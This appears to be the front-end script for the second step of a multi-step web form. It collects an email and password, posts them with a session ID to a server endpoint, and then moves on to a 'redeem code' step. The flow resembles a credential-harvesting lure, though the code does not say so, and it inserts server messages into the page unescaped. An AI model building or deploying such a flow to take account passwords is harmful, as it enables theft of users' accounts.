// Step 2 JavaScript - Email and Password Form
document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('step2Form');
    const loadingOverlay = document.getElementById('loadingOverlay');
    const successModal = document.getElementById('successModal');
    
    // Get session ID from step 1
    const sessionId = sessionStorage.getItem('mlSessionId');
    
    // If no session ID, redirect back to step 1
    if (!sessionId) {
        window.location.href = '/';
        return;
    }
    
    // Add floating animations to inputs
    const inputs = document.querySelectorAll('input');
    inputs.forEach(input => {
        input.addEventListener('focus', function() {
            this.parentElement.style.transform = 'translateY(-2px)';
            this.parentElement.style.transition = 'transform 0.3s ease';
        });
        
        input.addEventListener('blur', function() {
            this.parentElement.style.transform = 'translateY(0)';
        });
        
        // Real-time validation
        input.addEventListener('input', function() {
            validateInput(this);
        });
    });
    
    // Password visibility toggle
    window.togglePassword = function() {
        const passwordInput = document.getElementById('password');
        const toggleBtn = document.querySelector('.toggle-password');
        
        if (passwordInput.type === 'password') {
            passwordInput.type = 'text';
            toggleBtn.textContent = '🙈';
        } else {
            passwordInput.type = 'password';
            toggleBtn.textContent = '👁️';
        }
    };
    
    // Form submission
    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const email = document.getElementById('email').value.trim();
        const password = document.getElementById('password').value;
        
        // Validate inputs
        if (!validateForm()) {
            return;
        }
        
        // Show loading
        showLoading();
        
        try {
            const response = await fetch('/api/step2', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    email,
                    password,
                    sessionId
                })
            });
            
            const result = await response.json();
            
            if (result.success) {
                // Simulate processing time for better UX
                setTimeout(() => {
                    hideLoading();
                    
                    // Redirect to step 3 for redeem code
                    document.body.style.opacity = '0';
                    setTimeout(() => {
                        window.location.href = `/step3?sessionId=${sessionId}`;
                    }, 300);
                }, 1500);
            } else {
                hideLoading();
                showError(result.message || 'An error occurred. Please try again.');
            }
        } catch (error) {
            hideLoading();
            showError('Network error. Please check your connection and try again.');
            console.error('Error:', error);
        }
    });
    
    function validateInput(input) {
        const value = input.value.trim();
        const inputGroup = input.parentElement;
        
        // Remove existing validation classes
        inputGroup.classList.remove('error', 'success');
        
        if (input.id === 'email') {
            if (value.length > 0) {
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                if (emailRegex.test(value)) {
                    inputGroup.classList.add('success');
                    return true;
                } else {
                    inputGroup.classList.add('error');
                    return false;
                }
            }
        } else if (input.id === 'password') {
            if (value.length > 0) {
                if (value.length >= 6) {
                    inputGroup.classList.add('success');
                    return true;
                } else {
                    inputGroup.classList.add('error');
                    return false;
                }
            }
        }
        
        return true;
    }
    
    function validateForm() {
        const email = document.getElementById('email').value.trim();
        const password = document.getElementById('password').value;
        
        let isValid = true;
        
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!email || !emailRegex.test(email)) {
            showFieldError('email', 'Please enter a valid email address');
            isValid = false;
        }
        
        if (!password || password.length < 6) {
            showFieldError('password', 'Password must be at least 6 characters long');
            isValid = false;
        }
        
        return isValid;
    }
    
    function showFieldError(fieldId, message) {
        const input = document.getElementById(fieldId);
        const inputGroup = input.parentElement;
        
        // Remove existing error message
        const existingError = inputGroup.querySelector('.error-message');
        if (existingError) {
            existingError.remove();
        }
        
        // Add error styling
        inputGroup.classList.add('error');
        
        // Create and add error message
        const errorDiv = document.createElement('div');
        errorDiv.className = 'error-message';
        errorDiv.textContent = message;
        errorDiv.style.cssText = `
            color: #ff4444;
            font-size: 0.8rem;
            margin-top: 5px;
            animation: fadeIn 0.3s ease;
        `;
        
        inputGroup.appendChild(errorDiv);
        
        // Focus the input
        input.focus();
    }
    
    function showLoading() {
        loadingOverlay.style.display = 'flex';
        loadingOverlay.style.opacity = '0';
        setTimeout(() => {
            loadingOverlay.style.opacity = '1';
        }, 10);
    }
    
    function hideLoading() {
        loadingOverlay.style.opacity = '0';
        setTimeout(() => {
            loadingOverlay.style.display = 'none';
        }, 300);
    }
    
    function showSuccessModal() {
        successModal.style.display = 'flex';
        successModal.style.opacity = '0';
        setTimeout(() => {
            successModal.style.opacity = '1';
        }, 10);
    }
    
    window.closeModal = function() {
        successModal.style.opacity = '0';
        setTimeout(() => {
            successModal.style.display = 'none';
            // Redirect to home page
            window.location.href = '/';
        }, 300);
    };
    
    function showError(message) {
        // Create error notification
        const errorDiv = document.createElement('div');
        errorDiv.className = 'error-notification';
        errorDiv.innerHTML = `
            <div class="error-content">
                <span class="error-icon">⚠️</span>
                <p>${message}</p>
                <button onclick="this.parentElement.parentElement.remove()" class="error-close">×</button>
            </div>
        `;
        
        errorDiv.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: rgba(255, 68, 68, 0.95);
            backdrop-filter: blur(10px);
            color: white;
            padding: 15px;
            border-radius: 8px;
            box-shadow: 0 8px 32px rgba(255, 68, 68, 0.3);
            z-index: 1002;
            animation: slideInRight 0.3s ease;
            max-width: 300px;
        `;
        
        document.body.appendChild(errorDiv);
        
        // Auto remove after 5 seconds
        setTimeout(() => {
            if (document.body.contains(errorDiv)) {
                errorDiv.remove();
            }
        }, 5000);
    }
    
    function createConfetti() {
        const colors = ['#FFD700', '#FF6B35', '#3F51B5', '#4CAF50', '#E91E63'];
        const confettiCount = 50;
        
        for (let i = 0; i < confettiCount; i++) {
            setTimeout(() => {
                const confetti = document.createElement('div');
                confetti.style.cssText = `
                    position: fixed;
                    width: 10px;
                    height: 10px;
                    background: ${colors[Math.floor(Math.random() * colors.length)]};
                    left: ${Math.random() * 100}vw;
                    top: -10px;
                    z-index: 1003;
                    pointer-events: none;
                    animation: confettiFall ${2 + Math.random() * 3}s linear forwards;
                    transform: rotate(${Math.random() * 360}deg);
                `;
                
                document.body.appendChild(confetti);
                
                setTimeout(() => {
                    if (document.body.contains(confetti)) {
                        confetti.remove();
                    }
                }, 5000);
            }, i * 50);
        }
    }
    
    // Add CSS for validation states and animations
    const style = document.createElement('style');
    style.textContent = `
        .input-group.success input {
            border-color: #4caf50;
            box-shadow: 0 0 10px rgba(76, 175, 80, 0.3);
        }
        
        .input-group.error input {
            border-color: #ff4444;
            box-shadow: 0 0 10px rgba(255, 68, 68, 0.3);
        }
        
        .error-message {
            animation: fadeIn 0.3s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        @keyframes slideInRight {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        
        @keyframes confettiFall {
            to {
                transform: translateY(100vh) rotate(720deg);
                opacity: 0;
            }
        }
        
        .error-content {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .error-close {
            background: none;
            border: none;
            color: white;
            font-size: 1.2rem;
            cursor: pointer;
            margin-left: auto;
        }
        
        /* Password strength indicator */
        .password-strength {
            height: 4px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 2px;
            margin-top: 8px;
            overflow: hidden;
        }
        
        .password-strength-bar {
            height: 100%;
            transition: width 0.3s ease;
            border-radius: 2px;
        }
        
        .strength-weak { background: #ff4444; width: 33%; }
        .strength-medium { background: #ff9800; width: 66%; }
        .strength-strong { background: #4caf50; width: 100%; }
    `;
    document.head.appendChild(style);
    
    // Add password strength indicator
    const passwordInput = document.getElementById('password');
    const passwordGroup = passwordInput.parentElement;
    
    const strengthIndicator = document.createElement('div');
    strengthIndicator.className = 'password-strength';
    strengthIndicator.innerHTML = '<div class="password-strength-bar"></div>';
    passwordGroup.appendChild(strengthIndicator);
    
    passwordInput.addEventListener('input', function() {
        const password = this.value;
        const strengthBar = strengthIndicator.querySelector('.password-strength-bar');
        
        // Reset classes
        strengthBar.className = 'password-strength-bar';
        
        if (password.length === 0) {
            strengthBar.style.width = '0%';
        } else if (password.length < 6) {
            strengthBar.classList.add('strength-weak');
        } else if (password.length < 10) {
            strengthBar.classList.add('strength-medium');
        } else {
            strengthBar.classList.add('strength-strong');
        }
    });
    
    // Add smooth page transition
    document.body.style.opacity = '0';
    setTimeout(() => {
        document.body.style.transition = 'opacity 0.5s ease';
        document.body.style.opacity = '1';
    }, 100);
});